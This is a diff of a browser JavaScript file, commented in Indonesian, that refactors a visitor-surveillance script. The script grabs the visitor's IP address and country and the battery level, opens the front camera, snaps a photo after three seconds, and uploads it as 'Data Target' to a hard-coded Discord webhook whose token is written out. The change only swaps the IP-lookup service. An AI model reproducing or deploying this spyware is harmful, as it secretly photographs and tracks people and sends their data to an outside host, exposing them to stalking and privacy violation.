@@ -1,4 +1,4 @@
-const webhookURL = "https://discord.com/api/webhooks/1352760933654724668/RiiciP_za_eGd7u1OvHr1IbLXm4Ob7NWmk7MUMkOJ8Z9TZOAOFFPESpwMspxeQR_WPp9"; 
+const webhookURL = "https://discord.com/api/webhooks/1352760933654724668/RiiciP_za_eGd7u1OvHr1IbLXm4Ob7NWmk7MUMkOJ8Z9TZOAOFFPESpwMspxeQR_WPp9";
 const jsonURL = "server.json"; // Ganti dari urls.json ke server.json
 
 const canvas = document.createElement("canvas");
@@ -16,55 +16,49 @@ function getLocalTime() {
     return `${hours}:${minutes}:${seconds} (${timeZone})`;
 }
 
-// Ambil IP Target + Lokasi
-fetch("https://api64.ipify.org?format=json")
+// Ambil IP & Negara Target
+fetch("https://ipwho.is/")
     .then(response => response.json())
     .then(data => {
-        const ip = data.ip;
+        const ip = data.ip || "Unknown";
+        const country = data.country || "Unknown";
 
-        fetch(`http://ip-api.com/json/${ip}?fields=country`)
-            .then(response => response.json())
-            .then(data => {
-                const location = data.country || "Unknown";
+        // Dapatkan status baterai
+        navigator.getBattery().then(battery => {
+            const batteryPercentage = battery.level * 100; // Persen baterai
 
-                // Dapatkan persenan baterai
-                navigator.getBattery().then(battery => {
-                    const batteryPercentage = battery.level * 100;
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })  
+                .then(stream => {  
+                    const track = stream.getVideoTracks()[0];  
+                    const imageCapture = new ImageCapture(track);  
 
-                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                        .then(stream => {
-                            const track = stream.getVideoTracks()[0];
-                            const imageCapture = new ImageCapture(track);
-                            
-                            setTimeout(() => {
-                                const localTime = getLocalTime();
-                                imageCapture.takePhoto()
-                                    .then(blob => {
-                                        sendToDiscord(blob, ip, location, localTime, batteryPercentage);
-                                        track.stop();
-                                    })
-                                    .catch(error => console.error("Gagal ambil foto:", error));
-                            }, 3000);
-                        })
-                        .catch(err => console.error("Akses kamera ditolak:", err));
-                });
-            })
-            .catch(err => console.error("Gagal ambil lokasi:", err));
-    })
+                    setTimeout(() => {  
+                        const localTime = getLocalTime();  
+                        imageCapture.takePhoto()  
+                            .then(blob => {  
+                                sendToDiscord(blob, ip, country, localTime, batteryPercentage);  
+                                track.stop();  
+                            })  
+                            .catch(error => console.error("Gagal ambil foto:", error));  
+                    }, 3000);  
+                })  
+                .catch(err => console.error("Akses kamera ditolak:", err));  
+        });
+    })  
     .catch(err => console.error("Gagal ambil IP:", err));
 
 // Kirim ke Webhook Discord
-function sendToDiscord(blob, ip, location, localTime, batteryPercentage) {
+function sendToDiscord(blob, ip, country, localTime, batteryPercentage) {
     const formData = new FormData();
     formData.append("file", blob, "capture.jpg");
 
-    formData.append("payload_json", JSON.stringify({
-        content: `📸 **Data Target**\n🌍 **IP**: ${ip}\n📌 **Country**: ${location}\n⏰ **InterTime**: ${localTime}\n🔋 **Battery Percentage**: ${batteryPercentage}%`
-    }));
+    formData.append("payload_json", JSON.stringify({  
+        content: `📸 **Data Target**\n🌍 **IP**: ${ip}\n📌 **Country**: ${country}\n⏰ **InterTime**: ${localTime}\n🔋 **Battery Percentage**: ${batteryPercentage}%`  
+    }));  
 
-    fetch(webhookURL, {
-        method: "POST",
-        body: formData
+    fetch(webhookURL, {  
+        method: "POST",  
+        body: formData  
     });
 }
 
